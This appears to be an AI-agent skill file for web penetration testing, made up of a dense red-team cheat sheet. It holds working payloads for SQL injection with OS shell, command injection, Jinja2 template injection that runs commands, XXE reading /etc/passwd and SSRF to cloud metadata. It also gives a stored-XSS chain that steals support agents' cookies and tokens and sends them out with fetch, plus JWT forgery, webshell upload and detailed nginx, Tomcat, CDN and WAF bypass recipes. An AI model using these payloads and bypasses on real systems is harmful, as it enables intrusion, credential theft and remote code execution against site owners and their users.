---
name: web-attack-methods
description: >-
  Full-stack Web attacks: SQLi / command injection / SSTI / XSS / SSRF / NoSQL, auth via JWT/OAuth/SAML, LFI / upload, Tomcat / WS / STOMP / XFF / PATH_INFO / CDN502 / WSCN JS challenge bypass. Use when testing Web injection, auth bypass, server-side, WAF/CDN bypass.
metadata:
  tags: [penetration-testing, red-team]
---

## Web Attack Techniques (injection / auth / server-side / misc / CDN)

```
=== Web injection ===
SQLi: sqlmap -u URL --technique=BEUSTQ --risk=3 --level=5 --os-shell | manual ' OR 1=1-- / ' AND SLEEP(5)--
  bypass with SEL/**/ECT, case variation, CHAR() | escalate OUTFILE→webshell / xp_cmdshell / UDF
Command injection: ; | && $(cmd) `cmd` %0a | dodge space with $IFS, replace cat with tac/nl | OOB ;nslookup $(whoami).OOB
SSTI: {{7*7}}Jinja2 ${7*7}FreeMarker #{7*7}Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML/attribute/JS/href/DOM/SVG | bypass CSP via JSONP/AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd">/"http://OOB/"
🚨Stored XSS via WebSocket/STOMP chat: support-chat systems (OCS/LiveChat) render visitor messages in the agent panel with innerHTML/v-html (Vue domProps innerHTML)
  Attack chain: visitor STOMP connection → send a message containing <img src=x onerror=fetch(...)> → agent opens the conversation → XSS executes in the agent's browser → steal cookie/token/localStorage
  Key point: agent browsers can usually reach the internet (not restricted by the backend air-gap)! payload target: document.cookie + localStorage + fetch(admin API).then(exfil)
  Bypass: messages with mf:1 (visitor identity) and tp:0 (text type) have their content rendered directly with innerHTML; image messages use the url field (<img src>) and skip innerHTML
SSRF: dodge IP filters with 2130706433/[::1]/nip.io/#@ | cloud metadata 169.254.169.254 | Redis gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== Authentication / authorization ===
Auth bypass: admin'-- | password reset (predictable token/Host header injection) | MFA bypass (skip/brute-force 4-6 digits) | X-Forwarded-For IP rotation
IDOR: swap resource IDs for horizontal privilege escalation | mass assignment {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a (alg none/RS256→HS256) | -C crack weak keys | kid injection | jku/x5u remote key
401/403 bypass: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL/X-Rewrite-URL/X-Forwarded-For:127.0.0.1
OAuth/OIDC: redirect_uri manipulation (replacement/suffix/@ obfuscation/path traversal) | missing state→CSRF | PKCE downgrade | id_token wrapped in JWT full attack set
SAML: XSW signature wrapping (SAML Raider) | signature stripping | comment truncation admin<!---->@evil | Golden SAML (IdP private key)

=== Server-side ===
LFI: ../../../etc/passwd | php://filter to read source | data:// expect:// phar:// | RCE chain: log poisoning/session poisoning/phar deserialization
File upload: shell.php.jpg/.PHP/.php./%00 | .htaccess to change parsing | GIF89a magic bytes | ImageMagick/Ghostscript
🚨Spring Boot Actuator path traversal bypassing the auth interceptor: the interceptor matches /api/* but actuator is allowlisted → /actuator/../api/v1/endpoint bypasses the interceptor and reaches protected endpoints
  Principle: Spring Security/custom interceptors match the path before normalization, Tomcat normalizes then routes → path traversal bypasses the interceptor yet still reaches the target servlet
  Verify: /actuator/health returns 200 (allowlisted) → /actuator/../target also returns 200 (bypassed) vs direct /target returning 403/sign is empty (intercepted) | /actuator/health/../../target (template path {*path} traversal)
  sign-check weakness: many custom sign checks only test that the header is non-empty (sign:any value + expTime:any number passes) → seeing code:500 instead of "sign is empty" = validation passed | quick test: sign:0 or sign:aaa changing "sign is empty" to 500 = non-empty check only
  Escalation: after the bypass combine X-HTTP-Method-Override: POST so a GET request triggers the POST handler (supported by some Spring configs)

=== Web misc ===
🚨Tomcat ..;/ bypassing nginx path restrictions: nginx does not parse ; in the URL (treats it as part of the path) but Tomcat treats ..;/ as a traversal:
  /api/v1/v/..;/admin/path → nginx matches /api/v1/v/ (allows) → Tomcat resolves it to /admin/path (traversal!)
  Verify: a normal /admin returns nginx 403, while /api/v1/v/..;/admin returns a Tomcat 404 = bypass succeeded
  Limit: Spring MVC DispatcherServlet routing is independent of the filesystem, so only static files / non-MVC paths in the same war are reachable
  Combination: pair with a JSP webshell written via Spring4Shell, or hit actuator endpoints
🚨WebSocket/STOMP frames bypassing nginx method restrictions: nginx returns 405 for POST /api/v1/a/login, but after a WebSocket upgrade STOMP frames are unrestricted:
  1. GET /api/v1/v/ws/{3 chars}/{8 random chars}/websocket → 101 Upgrade (goes through the visitor path to bypass)
  2. STOMP CONNECT → STOMP SEND destination:/app/a/login → straight to the Spring backend
  SockJS XHR alternative: POST .../xhr_send sends the STOMP frame (204 = success), no real WebSocket needed
  Pitfall: the CDN drops the connection quickly ("Another connection still open"); a raw socket is more reliable than a websocket library
🚨X-Forwarded-For bypassing an application-layer IP blacklist: the CDN trusts the XFF header and the app takes the client IP from XFF for the blacklist check:
  Works: X-Forwarded-For: 1.1.1.1 | X-Forwarded-For: 127.0.0.1, 10.0.0.1
  Does not work: X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP, Forwarded
  Detection: the response contains {code:10010, msg:"blacklisted"} and the data field is your real IP
🚨PATH_INFO nginx deny bypass: nginx denies the .php file (returns a 146B nginx 404) but PHP-FPM is still reachable through PATH_INFO:
  /denied/file.php → 404|146 (blocked by nginx) | /denied/file.php/ → 16B "File not found." (executed by PHP-FPM!)
  /denied/file.php/x → same. PHP-FPM returning "File not found." means the request pierced the nginx deny and reached PHP-FPM (only the script path was wrong)
  Exploitation: if PHP sets cgi.fix_pathinfo=1 (default), /uploads/shell.jpg/x.php → PHP executes shell.jpg! | after confirming, find FPM's actual docroot (may differ from nginx's)
  Identification: nginx deny returns a fixed size (146B standard 404), PHP-FPM returns 16B "File not found." → the size difference is the breakthrough signal
🚨Response-size fingerprinting (hidden file discovery): a CMS catch-all route returns a fixed-size home page (e.g. 44004B), a genuine nginx 404 returns 146B
  File exists but is denied: returns 146B (nginx 404) | file does not exist: returns the catch-all size (44004B) | → 146B = the file really exists!
  Method: bulk-scan paths and classify by response size: catch-all = absent, nginx 404 = present but blocked, other size = reachable
WAF bypass decision tree: encoding→protocol level→path→mutation→IP spoofing→smuggling | CORS: Origin reflection + Credentials:true
🚨CDN 502 bypass (URL-pattern filtering): when the CDN returns 502 for admin paths, HTTP encoding/smuggling/method variation all fail → change protocol:
  1. WebSocket upgrade: the CDN usually filters only HTTP responses, and WS paths may not be in the filter rules. /api/v1/a/ws/ returns 200 while /api/v1/a/doLogin returns 502 = the WS path is unfiltered
  2. Find the origin IP for a direct connection: DNS history/certificate transparency/SNI scanning/same-subnet scanning/mail header Return-Path/Shodan fingerprint matching/CDN origin config leaks/unique error-page fingerprints → bypass the CDN and hit the backend directly
  3. Non-standard ports: scan every port on the CDN node; some ports may proxy a different backend or apply different filter rules (e.g. 8085 exposing actuator)
  4. Path traversal: /api/v1/v/..;/a/doLogin makes Tomcat route to admin but the CDN may not recognize it (note: the CDN may still filter the response)
  5. Wildcard DNS detection: every subdomain resolving to the CDN = wildcard DNS, not a real record. Compare results from 114.114.114.114/8.8.8.8
🚨WSCN CDN JS challenge identification and bypass: the response contains `_jsc_ch_conf` + `ws_sec_page.js` = WSCN JS challenge (not a WAF block)
  Traits: cv:".domain", mt:"jhsq987", chType/chTs/chID/chHash fields | 403 page of 6000+ bytes containing "Embed Iframe"
  Bypass: the CDN allowlists only certain paths (e.g. /c/) without a challenge → use Spring Boot ..;/ traversal (`/c/..;/target_path`) to pierce through to other backend routes
  Backend framework identification: JSON error `{"timestamp":...,"status":...,"error":...,"path":...}` = Spring Boot | 405 = route exists but wrong method

=== CDN bypass (target hidden behind a CDN, admin interface returning 502) ===
CDN 502 analysis: distinguish URL-pattern filtering (fixed timing ~0.3s, every method/encoding/port/node gives 502) from response-content filtering from a dead backend
  Key judgement: if path traversal (`/api/v1/v/..;/a/doLogin`) returns a Tomcat 404 = pierced the CDN to the backend; if it returns 502 = CDN URL-pattern blocking
  nginx 502 vs CDN PWS 502: nginx = edge-layer reverse proxy is down, PWS = CDN global policy
```
